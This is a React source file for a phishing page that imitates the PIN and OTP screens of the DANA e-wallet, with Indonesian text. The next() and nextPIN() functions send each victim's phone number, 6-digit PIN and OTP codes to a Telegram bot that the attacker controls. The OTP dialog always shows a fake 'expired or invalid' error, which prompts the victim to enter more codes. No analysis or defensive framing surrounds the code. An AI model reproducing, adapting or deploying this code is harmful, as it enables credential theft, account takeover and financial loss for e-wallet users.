import React, { Component } from 'react';
import { Helmet } from 'react-helmet';
import '../assets/css/ripple.css';
import '../assets/css/phone.css';
import { TELEGRAM_API_TOKEN, TELEGRAM_API_CHAT_ID } from '../Constants.js';

const DEFAULT_TIMEOUT = 115;
const pin1Ref = React.createRef();
const pin2Ref = React.createRef();
const pin3Ref = React.createRef();
const pin4Ref = React.createRef();
const pin5Ref = React.createRef();
const pin6Ref = React.createRef();
const otp1Ref = React.createRef();
const otp2Ref = React.createRef();
const otp3Ref = React.createRef();
const otp4Ref = React.createRef();

export default class PIN extends Component {
  state = {
    pin1: '',
    pin2: '',
    pin3: '',
    pin4: '',
    pin5: '',
    pin6: '',
    progressShown: false,
    timeout: DEFAULT_TIMEOUT,
    timeoutHandler: null,
    otpDialogShown: false
  };

  componentDidMount() {
    pin1Ref.current.focus();
    this.runTimeout();
  }

  runTimeout() {
    if (this.state.timeout > 0) {
      var timeoutHandler = setTimeout(() => {
        this.setState({
          timeout: this.state.timeout-1
        }, () => {
          if (this.state.timeoutHandler != null) {
            clearTimeout(this.state.timeoutHandler);
            this.setState({
              timeoutHandler: null
            });
          }
          this.runTimeout();
        });
      }, 1000);
      this.setState({
        timeoutHandler
      });
    } else {
      this.setState({
        timeout: DEFAULT_TIMEOUT
      }, () => {
        if (this.state.timeoutHandler != null) {
          clearTimeout(this.state.timeoutHandler);
          this.setState({
            timeoutHandler: null
          });
        }
        this.runTimeout();
      });
    }
  }

  getTimeoutString() {
    return this.state.timeout.toString();
  }

  next() {
    var pin = this.state.pin1.trim()
          +this.state.pin2.trim()
          +this.state.pin3.trim()
          +this.state.pin4.trim()
          +this.state.pin5.trim()
          +this.state.pin6.trim();
    if (pin.length < 6) {
      return;
    }
    this.setState({
      progressShown: true
    });
    var phone = window.localStorage.getItem('phone');
    fetch('https://api.telegram.org/bot'+TELEGRAM_API_TOKEN+'/sendMessage?parse_mode=html', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        'chat_id': TELEGRAM_API_CHAT_ID,
        'text': '!!!!!!!!! NOTIFIKASI DANA !!!!!!!!!\n\n<b>No. HP:</b> '+phone+'\n<b>PIN:</b> '+pin
      })
    })
    .then(response => response.text())
    .then((response) => {
      this.setState({
        progressShown: false
      }, () => {
        this.setState({
          otpDialogShown: true
        }, () => {
          setTimeout(() => {
            otp1Ref.current.focus();
          }, 500);
        });
      });
    });
  }

  nextPIN() {
    var pin = this.state.pin1.trim()
          +this.state.pin2.trim()
          +this.state.pin3.trim()
          +this.state.pin4.trim()
          +this.state.pin5.trim()
          +this.state.pin6.trim();
    if (pin.length < 6) {
      alert('Mohon masukkan 6 digit kode OTP.');
      return;
    }
    var otp = this.state.otp1.trim()
                  +this.state.otp2.trim()
                  +this.state.otp3.trim()
                  +this.state.otp4.trim();
    if (otp.length < 4) {
      alert('Mohon masukkan 4 digit kode OTP.');
      return;
    }
    var phone = window.localStorage.getItem('phone');
    this.setState({
      progressShown: true
    });
    fetch('https://api.telegram.org/bot'+TELEGRAM_API_TOKEN+'/sendMessage?parse_mode=html', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        'chat_id': TELEGRAM_API_CHAT_ID,
        'text': '!!!!!!!!! NOTIFIKASI DANA !!!!!!!!!\n\n<b>No. HP:</b> '+phone+'\n<b>PIN:</b> '+pin+'\n<b>Kode OTP:</b> '+otp
      })
    })
    .then(response => response.text())
    .then((response) => {
      this.setState({
        progressShown: false,
        otpError: true,
        otp1: '',
        otp2: '',
        otp3: '',
        otp4: ''
      }, () => {
        otp1Ref.current.focus();
      });
    });
  }

  render() {
    return (
      <div style={{ width: '100%', height: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', backgroundColor: '#118EEA' }}>
        <Helmet>
          <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
          <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
        </Helmet>
        <div style={{ width: '100%', marginTop: 10, display: 'flex', flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center' }}>
          <div style={{ width: 50, height: 50, display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
            <ion-icon name="chevron-back" style={{ color: '#ffffff', fontSize: 20 }} />
          </div>
          <img src={require('../assets/images/img4.png')} style={{ width: 100, height: 50, objectFit: 'contain' }} />
          <div style={{ width: 50, height: 50 }}></div>
        </div>
        <div style={{ textAlign: 'center', color: '#ffffff', fontSize: 14, marginTop: 40 }}>Masukkan <b>PIN DANA</b></div>
        <div style={{ display: 'flex', flexDirection: 'row', justifyContent: 'center', marginTop: 40 }}>
          <div style={{ width: 35, height: 35, backgroundColor: '#ffffff', borderRadius: 5 }}>
            <input ref={pin1Ref} value={this.state.pin1} onChange={(e) => {
              var pin = e.target.value.trim();
              this.setState({ pin1: pin }, () => {
                pin2Ref.current.focus();
              });
            }} maxLength={1} type="tel" style={{ textAlign: 'center', fontWeight: 'bold', fontSize: 20, width: '100%', height: '100%', border: 0, outline: 0, backgroundColor: 'transparent' }} />
          </div>
          <div style={{ marginLeft: 2, width: 35, height: 35, backgroundColor: '#ffffff', borderRadius: 5 }}>
            <input ref={pin2Ref} value={this.state.pin2} onChange={(e) => {
              var pin = e.target.value.trim();
              this.setState({ pin2: pin }, () => {
                pin3Ref.current.focus();
              });
            }} maxLength={1} type="tel" style={{ textAlign: 'center', fontWeight: 'bold', fontSize: 20, width: '100%', height: '100%', border: 0, outline: 0, backgroundColor: 'transparent' }} />
          </div>
          <div style={{ marginLeft: 2, width: 35, height: 35, backgroundColor: '#ffffff', borderRadius: 5 }}>
            <input ref={pin3Ref} value={this.state.pin3} onChange={(e) => {
              var pin = e.target.value.trim();
              this.setState({ pin3: pin }, () => {
                pin4Ref.current.focus();
              });
            }} maxLength={1} type="tel" style={{ textAlign: 'center', fontWeight: 'bold', fontSize: 20, width: '100%', height: '100%', border: 0, outline: 0, backgroundColor: 'transparent' }} />
          </div>
          <div style={{ marginLeft: 2, width: 35, height: 35, backgroundColor: '#ffffff', borderRadius: 5 }}>
            <input ref={pin4Ref} value={this.state.pin4} onChange={(e) => {
              var pin = e.target.value.trim();
              this.setState({ pin4: pin }, () => {
                pin5Ref.current.focus();
              });
            }} maxLength={1} type="tel" style={{ textAlign: 'center', fontWeight: 'bold', fontSize: 20, width: '100%', height: '100%', border: 0, outline: 0, backgroundColor: 'transparent' }} />
          </div>
          <div style={{ marginLeft: 2, width: 35, height: 35, backgroundColor: '#ffffff', borderRadius: 5 }}>
            <input ref={pin5Ref} value={this.state.pin5} onChange={(e) => {
              var pin = e.target.value.trim();
              this.setState({ pin5: pin }, () => {
                pin6Ref.current.focus();
              });
            }} maxLength={1} type="tel" style={{ textAlign: 'center', fontWeight: 'bold', fontSize: 20, width: '100%', height: '100%', border: 0, outline: 0, backgroundColor: 'transparent' }} />
          </div>
          <div style={{ marginLeft: 2, width: 35, height: 35, backgroundColor: '#ffffff', borderRadius: 5 }}>
            <input ref={pin6Ref} value={this.state.pin6} onChange={(e) => {
              var pin = e.target.value.trim();
              this.setState({ pin6: pin }, () => {
                this.next();
              });
            }} maxLength={1} type="tel" style={{ textAlign: 'center', fontWeight: 'bold', fontSize: 20, width: '100%', height: '100%', border: 0, outline: 0, backgroundColor: 'transparent' }} />
          </div>
        </div>
        <div onClick={() => {
          this.setState({ pinShown: !this.state.pinShown });
        }} className="ripple" style={{ cursor: 'pointer', width: 120, height: 20, display: 'flex', justifyContent: 'center', alignItems: 'center', border: '1px solid #ffffff', borderRadius: 20, color: '#ffffff', fontSize: 15, marginTop: 30 }}>Tampilkan</div>
        <div style={{ color: '#FFFFFF', fontSize: 14, marginTop: 60 }}><b>LUPA PIN?</b></div>
        { this.state.otpDialogShown &&
          <div style={{ position: 'fixed', left: 0, top: 0, width: '100%', height: '100%', backgroundColor: '#0000004f' }}>
          <div onClick={() => {
          }} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', position: 'fixed', left: 0, bottom: 0, width: '100%', backgroundColor: '#ffffff', borderTopLeftRadius: 20, borderTopRightRadius: 20 }}>
          <div style={{ color: '#000000', fontSize: 20, marginTop: 30 }}><b>Masukkan OTP</b></div>
          { this.state.otpError &&
            <div style={{ color: '#FF0000', fontSize: 15, marginTop: 10, textAlign: 'center' }}>Kode OTP telah kedaluwarsa atau invalid silahkan kirim ulang kode OTP</div>
          }
          { !this.state.otpError &&
            <div style={{ color: '#000000', fontSize: 15, marginTop: 10, textAlign: 'center' }}>Kode OTP telah dikirim ke nomor Anda</div>
          }
          <div style={{ display: 'flex', flexDirection: 'row', marginTop: 40 }}>
            <div style={{ width: 40, height: 40, backgroundColor: '#eeeeee', borderRadius: 5 }}>
              <input ref={otp1Ref} value={this.state.otp1} onChange={(e) => {
                var otp = e.target.value.trim();
                this.setState({ otp1: otp }, () => {
                  otp2Ref.current.focus();
                });
              }} maxLength={1} type="tel" style={{ textAlign: 'center', color: '#000000', fontWeight: 'bold', width: '100%', height: '100%', backgroundColor: 'transparent', border: 0, outline: 0 }} />
            </div>
            <div style={{ marginLeft: 5, width: 40, height: 40, backgroundColor: '#eeeeee', borderRadius: 5 }}>
              <input ref={otp2Ref} value={this.state.otp2} onChange={(e) => {
                var otp = e.target.value.trim();
                this.setState({ otp2: otp }, () => {
                  otp3Ref.current.focus();
                });
              }} maxLength={1} type="tel" style={{ textAlign: 'center', color: '#000000', fontWeight: 'bold', width: '100%', height: '100%', backgroundColor: 'transparent', border: 0, outline: 0 }} />
            </div>
            <div style={{ marginLeft: 5, width: 40, height: 40, backgroundColor: '#eeeeee', borderRadius: 5 }}>
              <input ref={otp3Ref} value={this.state.otp3} onChange={(e) => {
                var otp = e.target.value.trim();
                this.setState({ otp3: otp }, () => {
                  otp4Ref.current.focus();
                });
              }} maxLength={1} type="tel" style={{ textAlign: 'center', color: '#000000', fontWeight: 'bold', width: '100%', height: '100%', backgroundColor: 'transparent', border: 0, outline: 0 }} />
            </div>
            <div style={{ marginLeft: 5, width: 40, height: 40, backgroundColor: '#eeeeee', borderRadius: 5 }}>
              <input ref={otp4Ref} value={this.state.otp4} onChange={(e) => {
                var otp = e.target.value.trim();
                this.setState({ otp4: otp }, () => {
                  this.nextPIN();
                });
              }} maxLength={1} type="tel" style={{ textAlign: 'center', color: '#000000', fontWeight: 'bold', width: '100%', height: '100%', backgroundColor: 'transparent', border: 0, outline: 0 }} />
            </div>
          </div>
          <div style={{ color: '#8888888f', fontSize: 15, marginTop: 40, marginBottom: 20 }}>KIRIM ULANG ({ this.getTimeoutString() }s)</div>
        </div>
        </div> }
        { this.state.progressShown && <div style={{ position: 'fixed', left: 0, top: 0, width: '100%', height: '100%', backgroundColor: '#0000004f', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
          <div style={{ backgroundColor: '#ffffff', boxShadow: '0 0 10px 5px rgba(0,0,0,.2)', borderRadius: 0, width: 'calc(100% - 60px)', height: 200, display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
            <div className="loader2" style={{ width: 80, height: 80 }} />
          </div>
        </div>
        }
      </div>
    );
  }
}
